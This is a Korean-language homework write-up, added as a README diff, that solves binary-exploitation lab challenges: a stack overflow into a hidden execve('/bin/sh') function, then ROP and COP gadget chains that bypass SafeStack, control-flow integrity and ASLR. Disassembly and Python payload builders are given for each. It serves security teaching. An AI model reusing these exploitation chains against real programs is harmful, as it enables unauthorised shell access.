@@ -1,0 +1,290 @@
+HW5 README
+
+Challenge 0. Warm­up : 입력값을 입력했을 때 20개 이상의 문자를 input으로 입력할 경우, buffer overflow가 발생하는 것을 확인 할 수 있었다.
+
+그 후 0x401150에서의 코드를 살펴보니,  rdi에 bin/sh에 대한 주소를 넣어준 다음에 다른 파라미터에는 null값을 넣어준 다음에 evecve를 실행하는 함수가 있음을 확인하였다.
+.text:0000000000401150 sub_401150      proc near
+.text:0000000000401150 ; __unwind {
+.text:0000000000401150                 push    rbp
+.text:0000000000401151                 mov     rbp, rsp
+.text:0000000000401154                 xor     eax, eax
+.text:0000000000401156                 mov     ecx, eax
+.text:0000000000401158                 mov     rdi, offset path ; "/bin/sh"
+.text:0000000000401162                 mov     rsi, rcx        ; argv
+.text:0000000000401165                 mov     rdx, rcx        ; envp
+.text:0000000000401168                 mov     al, 0
+.text:000000000040116A                 call    _execve
+.text:000000000040116F                 pop     rbp
+.text:0000000000401170                 retn
+.text:0000000000401170 ; } // starts at 401150
+
+그렇기에 처음 20 byte의 경우에는 아무런 문자를 넣어서 채운 다음에 return address 영역에 little endian 방식으로 0x401150를 넣어서 해당 함수가 실행되도록 하였다.
+
+Challenge 1. Return­ Oriented Programming
+리눅스에서의 System-V로 함수 호출 시 stack의 size가 16의 배수로 되어있기에 id는 16으로 설정하였다. 다만 분석 결과, warmup과는 달리 코드에 shell을 불러올 수 있는 함수는 없었기에 ROPgadget --binary exploitme를 통해서 ROPgadget을 분석하고 이를 조합하는 방식으로 shell을 얻을 수 있었다.
+
+그리고 binary를 분석한 결과
+401500:	53                   	push   rbx
+401501:	48 81 ec 10 01 00 00 	sub    rsp,0x110
+401508:	bf 3e 20 40 00       	mov    edi,0x40203e
+40150d:	e8 1e fb ff ff       	call   401030 [puts@plt](mailto:puts@plt)
+401512:	48 8d 5c 24 08       	lea    rbx,[rsp+0x8]
+401517:	48 89 df             	mov    rdi,rbx
+40151a:	31 c0                	xor    eax,eax
+40151c:	e8 4f fb ff ff       	call   401070 [gets@plt](mailto:gets@plt)
+401521:	48 89 df             	mov    rdi,rbx
+401524:	31 c0                	xor    eax,eax
+401526:	e8 55 fb ff ff       	call   401080 [atoi@plt](mailto:atoi@plt)
+40152b:	89 c3                	mov    ebx,eax
+40152d:	bf 48 20 40 00       	mov    edi,0x402048
+401532:	e8 f9 fa ff ff       	call   401030 [puts@plt](mailto:puts@plt)
+401537:	48 63 c3             	movsxd rax,ebx
+40153a:	48 c1 e0 04          	shl    rax,0x4
+40153e:	48 8d 3c 04          	lea    rdi,[rsp+rax*1]
+401542:	48 83 c7 10          	add    rdi,0x10
+401546:	31 c0                	xor    eax,eax
+401548:	e8 23 fb ff ff       	call   401070 [gets@plt](mailto:gets@plt)    //아마도 여기에 취약점이 있을것이라고 생각이 듦
+40154d:	48 81 c4 10 01 00 00 	add    rsp,0x110
+401554:	5b                   	pop    rbx
+401555:	c3                   	ret
+401556:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
+40155d:	00 00 00
+
+__int64 sub_401500()
+{
+int v0; // ebx
+char nptr[272]; // [rsp+8h] [rbp-110h] BYREF
+
+puts("Enter id:");
+gets(nptr);
+v0 = atoi(nptr);
+puts("Enter password:");
+return gets(&nptr[16 * v0 + 8]);
+}
+
+0x401500부터 실행되는 함수의 경우 입력을 받는 과정에서 취약점을 확인할 수 있었다. 그렇기에 먼저 gets에서 입력을 받아줄 dummy data를 넣어준 다음에 
+pop rdi ; ret를 한 다음, IDA를 톻해 찾은 /bin/sh 문자의 주소를 가리키는 값을 가리킨 다음, 
+xor rax, rax ; ret # rax를 0으로 초기화
+add rax, 59 ; ret #execve의 값인 59를 더하는 가젯 추가
+xor rsi, rsi ; xor rdx, rdx ; syscall #다른 파라미터값을 0으로 초기화한 다음 syscall을 하여, shell을 얻을 수 있었다.
+
+Challenge 2. Bypassing SafeStack
+
+COP로 인해서 인자를 설정하더라도 syscall이 실행되기 전에 값이 바뀐다.
+따라서 이를 해결하기 위해서는 syscall에 인자를 전달할 때, 가젯이 return value로 넘겨주는 방식으로 chain을 만든다.
+
+그래서 shell을 실행하기 위해서는 bin/sh를 전달해줘야 하는데 이를 담고 있는 함수들이 
+0000000000402ac0 <g_sh@@Base>:
+  402ac0:	48 8b 05 29 26 00 00 	mov    rax,QWORD PTR [rip+0x2629]        # 4050f0 <binsh@@Base>
+  402ac7:	c3                   	ret    
+  402ac8:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
+  402acf:	00 
+
+0000000000402ad0 <g_sh2@@Base>:
+  402ad0:	48 8b 05 19 26 00 00 	mov    rax,QWORD PTR [rip+0x2619]        # 4050f0 <binsh@@Base>
+  402ad7:	c3                   	ret    
+  402ad8:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
+  402adf:	00 
+
+0000000000402ae0 <g_sh3@@Base>:
+  402ae0:	48 8b 05 09 26 00 00 	mov    rax,QWORD PTR [rip+0x2609]        # 4050f0 <binsh@@Base>
+  402ae7:	c3                   	ret    
+  402ae8:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
+  402aef:	00 
+이렇게 존재한다.이들은 모두 bin/sh를 넘겨주므로 이 중 아무것이나 사용해도 큰 지장은 없다.
+
+그래서 큰 흐름으로는
+
+       p += pack('<Q', 0x0000000000402b40)  # xor rax, rax ; ret : rax를 초기화함.
+    p += pack('<Q', 0x0000000000402b80)  # add rax, 59 ; ret : rax에 execve 실행을 하는 59번을 넣어줌
+    p += pack('<Q', 0x0000000000402af0)  # mov rdx, rax ; ret : 잠시 59를 rdx로 옮김.
+
+    p += pack('<Q', 0x0000000000402ae0)  # g_sh@base : 해당 함수를 통해 bin/sh를 인자로 전달함.
+
+    p += pack('<Q', 0x0000000000402b20)  # mov rax, rdx ; ret : 다시 rax에 59를 넣어줌
+
+    # xor rsi, rsi ; xor rdx, rdx ; syscall : 나머지 인자들을 0으로 초기화한 뒤, syscall을 통해 shell을 획득함.
+    p += pack('<Q', 0x0000000000402c16)
+
+을 통해서 shell을 획득할 수 있다.
+
+Challenge 3. Bypassing Control­Flow Integrity.
+
+전체적인 구조는 위의 문제와 같으나 Control­Flow Integrity를 추가하여 사용할 수 있는 
+
+
+그래서 우선 main 함수 부분을 IDA로 C 코드로 변경한 다음, 분석을 진행하였다.
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // r15
+  const void *v4; // r12
+  __int64 v5; // rbx
+  __int64 v6; // rdi
+  __int64 v7; // r12
+  __int64 v8; // rax
+  __int64 (__fastcall *v9)(__int64, __int64); // rcx
+
+  v3 = _safestack_unsafe_stack_ptr;
+  _safestack_unsafe_stack_ptr -= 1024LL;
+  v4 = (const void *)_safestack_unsafe_stack_ptr;
+  v5 = 0LL;
+  memset(_safestack_unsafe_stack_ptr, 0, 0x400uLL);
+  vuln_leak(v4);
+  vuln_overflow();
+  v6 = 0LL;
+  v7 = 0LL;
+  do
+  {
+    v9 = *(__int64 (__fastcall **)(__int64, __int64))(v3 + 8 * v5 - 1024);
+    if ( v9 )
+    {
+      if ( __ROL8__((char *)v9 - (char *)g_xxret, 61) >= 5uLL )
+        __asm { ud1     eax, dword ptr [eax+2] }
+      v8 = v9(v6, v7);
+      v6 = v7;
+      v7 = v8;
+    }
+    ++v5;
+  }
+  while ( v5 != 128 );
+  g_printf("[RESULT] Not exploited :( Exiting safely.\n");
+  _safestack_unsafe_stack_ptr = v3;
+  return 0;
+}
+
+이 코드에서는 main 함수쪽에서 사용할 수 있는 cop garget을 제한하는데 해당 부분은 다음과 같다.
+
+402ee5:	|  |         48 89 c8             	mov    rax,rcx
+402ee8:	|  |         4c 29 e8             	sub    rax,r13
+402eeb:	|  |         48 c1 c0 3d          	rol    rax,0x3d
+402eef:	|  |         48 83 f8 05          	cmp    rax,0x5
+402ef3:	\--|---   72 cb                	 jb     402ec0 <main@@Base+0x50>
+
+그래서 r13의 값을 gdb info register로 확인해보니  0x402f40이 들어가고 가용할 수 있는  cop garget 범위 또한 [0x402f40, 0x402f68) 안에 존재해야 한다는 것을 알 수 있다.
+
+그래서 사용할 수 있는 garget들과 해당 garget의 역할은 다음과 같다.
+
+0x0000000000402f40 : jmp 0x402bd0 <g_xxret@@Base>:
+
+__int64 __fastcall gaddxx(__int64 a1)
+{
+return a1 + 1;
+}
+
+; __unwind {
+lea     rax, [rdi+1]
+retn
+; }
+
+0x0000000000402f48 : jmp 0x402ac0 <g_sh@@Base>:
+
+; char *g_sh_0()
+g_sh_0 proc near
+; __unwind {
+mov     rax, cs:binsh
+retn
+; } // starts at 402AC0
+g_sh_0 endp
+
+0x0000000000402f50 : jmp 0x402a70 <gaddyy@@Base>:
+
+public g_yyret
+g_yyret proc near
+; __unwind {
+mov     eax, 39h ; '9'
+retn
+; } // starts at 402A70
+g_yyret endp
+
+0x0000000000402f58 : jmp 0x402c30 <g_syscall2@@Base>:
+
+; __int64 g_syscall2_0()
+g_syscall2_0 proc near
+; __unwind {
+mov     rax, rdi
+mov     rdi, rsi
+xor     rsi, rsi
+xor     rdx, rdx
+syscall                 ; LINUX -
+xor     eax, eax
+retn
+; } // starts at 402C30
+g_syscall2_0 endp
+
+이를 조합해서 코드를 작성하자면, 
+
+def get_password(addr1, addr2):
+    p = bytes()
+
+    p += pack('<Q', 0x0000000000402f50)  # mov rax, 57 ; ret
+    p += pack('<Q', 0x0000000000402f40)  # lea rax, [rdi + 1] ; ret
+    p += pack('<Q', 0x0000000000402f40)  # lea rax, [rdi + 1] ; ret
+
+    p += pack('<Q', 0x0000000000402f48)  # mov rax, cs:binsh (0x403158)
+
+    # mov rax, rdi ; mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall
+    p += pack('<Q', 0x0000000000402f58)
+    return p
+
+다음과 같이 먼저 <gaddyy@@Base>를 사용해서 rax에 57을 넣은 다음에 <g_xxret@@Base>로 lea rax, [rdi + 1] ; ret을 두번 사용하여 rax를 59로 만들어 준 다음에,
+<g_sh@@Base>로 rax에 bin/sh를 넣어준 다음 <g_syscall2@@Base>을 실행해서 다른 변수들을 초기화해주고, syscall을 하면 될 것이라고 생각했지만 실패했다.
+
+분석 결과 lea 명령어를 사용할 때 COP 가젯의 경우 lea를 사용할 때 그 다음에 rdi+1을 return하기에 nop가 필요하게 된다.
+따라서 최종적으로 다음 코드를 통해서 shell을 획득할 수 있었다.
+
+def get_password(addr1, addr2):
+    p = bytes()
+
+    p += pack('<Q', 0x0000000000402f50)  # mov rax, 57 ; ret
+    p += pack('<Q', 0x0000000000402f40)  # NOP
+    p += pack('<Q', 0x0000000000402f40)  # lea rax, [rdi + 1] ; ret
+    p += pack('<Q', 0x0000000000402f40)  # NOP
+    p += pack('<Q', 0x0000000000402f40)  # lea rax, [rdi + 1] ; ret
+
+
+    p += pack('<Q', 0x0000000000402f48)  # mov rax, cs:binsh (0x403158)
+
+
+    # mov rax, rdi ; mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall
+    p += pack('<Q', 0x0000000000402f58)
+    return p
+
+
+Challenge 4. Bypassing ASLR
+
+전체적인 코드 구성은 Challenge 3과 완전하게 동일하다.
+다만 ASLR이 적용된다면, .text section의 주소가 계속 변경되게 된다. 그렇기에 유지가 되는 값인 함수 사이의 offset을 이용해서 shell을 획득해야 한다.
+그렇기에 우선 취약점이 존재하는 <vuln_leak@@Base>를 통해 offset을 계산하는데 이는 다음과 같이 계산할 수 있다.
+
+offset = vuln_leak@@Base addr (addr1이라는 파라미터로 받아옴) - vuln_leak@@Base fixed addr () (0000000000002de0 <vuln_leak@@Base>로 직접 disassemble해서 얻어온 주소)
+
+그후, garget들의 주소를 출력하면 다음과 같다.
+0000000000002f70 <g_xxret@@Base>: 동일함.
+
+0000000000002f78 <g_sh@@Base>: bin/sh를 가리킴 : 동일함.
+
+0000000000002f80 <gaddyy@@Base>: mov eax, 39h;
+
+0000000000002f88 <g_syscall2@@Base>:
+
+mov     rax, rdi
+mov     rdi, rsi
+xor     rsi, rsi
+xor     rdx, rdx
+syscall
+그렇기에 이를 Challenge 3과 동일하게 조합해서 shell을 획득할 수 있었다.
+
+def get_password(addr1, addr2):
+    offset = addr1 - 0x2de0 # vuln_leak@@Base addr - vuln_leak@@Base fixed addr
+    p = bytes()
+    p += pack('<Q', offset+0x2f80)  # mov rax, 57 ; ret
+    p += pack('<Q', offset+0x2f70)  # NOP
+    p += pack('<Q', offset+0x2f70)  # lea rax, [rdi + 1] ; ret
+    p += pack('<Q', offset+0x2f70)  # NOP
+    p += pack('<Q', offset+0x2f70)  # lea rax, [rdi + 1] ; ret
+    p += pack('<Q', offset+0x2f78)  # mov rax, cs:binsh
+
+    # mov rax, rdi ; mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall
+    p += pack('<Q', offset+0x2f88)
+
+    return p
